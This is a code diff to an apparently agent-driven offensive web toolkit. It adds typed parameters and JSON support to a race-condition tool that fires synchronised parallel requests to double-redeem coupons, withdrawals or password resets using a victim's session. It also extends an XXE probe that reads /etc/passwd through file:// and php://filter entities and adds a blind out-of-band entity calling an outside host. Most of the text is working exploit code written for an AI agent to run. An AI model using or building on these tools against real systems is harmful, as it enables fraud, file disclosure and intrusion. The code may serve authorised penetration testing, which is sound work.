@@ -66,33 +66,64 @@ def _split_url(url):
 @register(name="race_smash",
           desc="EXPLOIT: race-condition smasher — barrier-released parallel requests (Turbo Intruder style). Prove double-processing on limits, votes, withdrawals, coupon redemption, password reset.",
           params={"type": "object", "properties": {
-              "url": {"description": "endpoint whose action must execute only once"},
+              "url": {"description": "endpoint whose action must execute only once", "type": "string"},
               "body": {"description": "request body (e.g. coupon=FREE, amount=100)"},
               "headers": {"description": "auth headers dict (session of the victim account)"},
-              "method": {"description": "HTTP method"},
-              "concurrency": {"description": "parallel requests per round"},
-              "rounds": {"description": "how many race rounds"},
-              "success_pattern": {"description": "marker proving the action was processed (e.g. applied, success)"}},
+              "method": {"description": "HTTP method", "type": "string"},
+              "concurrency": {"description": "parallel requests per round", "type": "integer"},
+              "rounds": {"description": "how many race rounds", "type": "integer"},
+              "success_pattern": {"description": "marker proving the action was processed (e.g. applied, success)", "type": "string"}},
               "required": ["url"]},
           danger="loud")
 def race_smash(url, body=None, headers=None, method="POST",
                concurrency=20, rounds=3, success_pattern=None):
+    # calib-B fix: the LLM sends rounds/concurrency as strings — the
+    # schema lacked types so _coerce_args passed them raw and
+    # range("3") crashed. Coerce here (defense in depth) + schema typed.
+    try:
+        rounds = int(rounds)
+    except (TypeError, ValueError):
+        rounds = 3
+    try:
+        concurrency = int(concurrency)
+    except (TypeError, ValueError):
+        concurrency = 20
+    rounds = max(1, min(rounds, 20))
+    concurrency = max(2, min(concurrency, 60))
     host, port, path, use_ssl = _split_url(url)
-    # Body must be a string for raw socket HTTP — auto-encode dicts
-    if isinstance(body, dict):
-        body = urlencode(body)
-    elif body is None:
-        body = ""
-    else:
-        body = str(body)
     if isinstance(headers, str):
         try:
             headers = json.loads(headers)
         except (json.JSONDecodeError, ValueError):
             headers = {}
     headers = dict(headers or {})
-    concurrency = max(2, min(30, int(concurrency)))
-    rounds = max(1, min(6, int(rounds)))
+
+    # Ω1.1 (audit-6): Support JSON payloads & preserve custom Content-Type
+    is_json = False
+    for k, v in headers.items():
+        if k.lower() == "content-type" and "json" in str(v).lower():
+            is_json = True
+            break
+
+    if isinstance(body, dict):
+        if is_json:
+            body = json.dumps(body)
+        else:
+            body = urlencode(body)
+    elif body is None:
+        body = ""
+    else:
+        body = str(body)
+        if not is_json and (body.startswith("{") or body.startswith("[")):
+            is_json = True
+            if not any(k.lower() == "content-type" for k in headers):
+                headers["Content-Type"] = "application/json"
+
+    # Only add default Content-Type if none was specified in headers
+    ct_hdr = ""
+    if not any(k.lower() == "content-type" for k in headers):
+        ct_hdr = "Content-Type: application/json\r\n" if is_json else "Content-Type: application/x-www-form-urlencoded\r\n"
+
     hl = "".join(f"{k}: {v}\r\n" for k, v in headers.items())
     findings = []
     baseline_st = None
@@ -103,9 +134,9 @@ def race_smash(url, body=None, headers=None, method="POST",
 
         def fire(i):
             req = (f"{method} {path} HTTP/1.1\r\nHost: {host}\r\n"
-                   f"{hl}Content-Type: application/x-www-form-urlencoded\r\n"
-                   f"Content-Length: {len(body)}\r\n"
-                   f"Connection: close\r\n\r\n{body}").encode()
+                   f"{hl}{ct_hdr}"
+                   f"Content-Length: {len(body.encode('utf-8'))}\r\n"
+                   f"Connection: close\r\n\r\n{body}").encode("utf-8")
             try:
                 barrier.wait(timeout=10)
             except threading.BrokenBarrierError:
@@ -284,22 +315,49 @@ def proto_pollute(url, gadget_check=None, method="GET", body=None):
           danger="loud")
 def xxe_probe(url, file="/etc/passwd", extra_fields=None):
     from tools._exploit_lib import paced_send
+    from tools.oob_channel import (oob_url as _oob_url,
+                                   register as _oob_register,
+                                   receipt as _oob_receipt)
     results = []
-    wrappers = {
-        "classic": f'<!ENTITY xxe SYSTEM "file://{file}">',
-        "php_filter": ('<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode'
-                       f'/resource={file}">'),
-        "utf16_classic": f'<!ENTITY xxe SYSTEM "file://{file}">',
-    }
     fields = ""
     for k, v in (extra_fields or {}).items():
         fields += f"<{k}>{v}</{k}>"
 
-    for tag, decl in wrappers.items():
+    # OOB lane (Phase 0.1): blind XXE — the parser swallows the direct
+    # echo but still resolves external parameter entities. The proof is
+    # OUR domain resolving. Freeze the predicate pre-send (nuclei
+    # RequestEvent), fire the parameter-entity ladder, then the receipt
+    # (or its absence) decides CONFIRMED vs hypothesis.
+    import urllib.parse as _up
+    _host = _up.urlsplit(url).netloc or "unknown"
+    _oob = _oob_url("xxe", _host)
+    _oob_register("xxe", _host,
+                  lambda inter: inter.get("protocol") in ("dns", "http", "https"),
+                  context={"url": url, "file": file})
+    # The blind probe: %remote; INSIDE the internal subset makes the
+    # parser fetch our URL. The body references NOTHING undefined — a
+    # dangling %file; or &xxe; here errors-out strict parsers BEFORE the
+    # fetch, and the callback would never fire (review bug #1).
+    oob_decl = (f'<!ENTITY % remote SYSTEM "http://{_oob}/probe">\n'
+                '%remote;')
+    # per-variant (decl, data): in-band ladders echo &xxe;; the OOB
+    # variant's body stays inert — the resolution IS the proof.
+    variants = {
+        "classic": (f'<!ENTITY xxe SYSTEM "file://{file}">', "&xxe;"),
+        "php_filter": ('<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode'
+                       f'/resource={file}">', "&xxe;"),
+        "utf16_classic": (f'<!ENTITY xxe SYSTEM "file://{file}">', "&xxe;"),
+        "oob_param_entity": (oob_decl, "probe"),
+    }
+    wrappers_order = ["classic", "php_filter", "utf16_classic",
+                      "oob_param_entity"]
+
+    for tag in wrappers_order:
+        decl, data_ref = variants[tag]
         xml = (f'<?xml version="1.0"?>\n<!DOCTYPE root [\n{decl}\n]>\n'
-               f'<root>{fields}<data>&xxe;</data></root>')
+               f'<root>{fields}<data>{data_ref}</data></root>')
         st, resp, _ = paced_send(url, method="POST", body=xml.encode(),
-                                 headers={"Content-Type": "application/xml"}, timeout=15)
+                                  headers={"Content-Type": "application/xml"}, timeout=15)
         body = resp or ""
         hit = any(m in body for m in MARKS)
         b64ish = ("classic" not in tag and len(body) > 60
@@ -308,9 +366,28 @@ def xxe_probe(url, file="/etc/passwd", extra_fields=None):
                         "b64_payload": b64ish, "excerpt": body[:200]})
 
     hit = any(r["file_marker"] or r["b64_payload"] for r in results)
+    _oob_rec = _oob_receipt("xxe", _host)
+    # a REAL HTTP response (>0): synthetic -1 transport-dead, -2 budget,
+    # -3 quarantine-skip are NOT "the endpoint responded" (review bug #2)
+    responded = any(isinstance(r.get("status"), int) and r["status"] > 0
+                    for r in results)
+    # law #2: blind XXE is CONFIRMED only by the callback. In-band markers
+    # confirm directly; a responding-but-silent endpoint stays 'partial'
+    # (hypothesis — predicate frozen, callback pending); silence stays False.
+    if _oob_rec or hit:
+        exploitable = True
+    elif responded:
+        exploitable = "partial"
+    else:
+        exploitable = False
     summary = (f"XXE file read {'CONFIRMED' if hit else 'not evident'} on {file} — "
-               f"{sum(r['file_marker'] for r in results)}/{len(results)} variants returned OS markers")
-    return verdict("xxe_probe", hit, summary, evidence=[r["excerpt"] for r in results[:3]],
+               f"{sum(r['file_marker'] for r in results)}/{len(results)} variants returned OS markers"
+               + (f" — BLIND XXE CONFIRMED via OOB callback ({_oob_rec['protocol']})"
+                  if _oob_rec else ""))
+    return verdict("xxe_probe", exploitable, summary,
+                   evidence=[r["excerpt"] for r in results[:3]],
+                   oob={"url": _oob, "callback_received": bool(_oob_rec),
+                        "proof": _oob_rec},
                    variants=results)
 
 
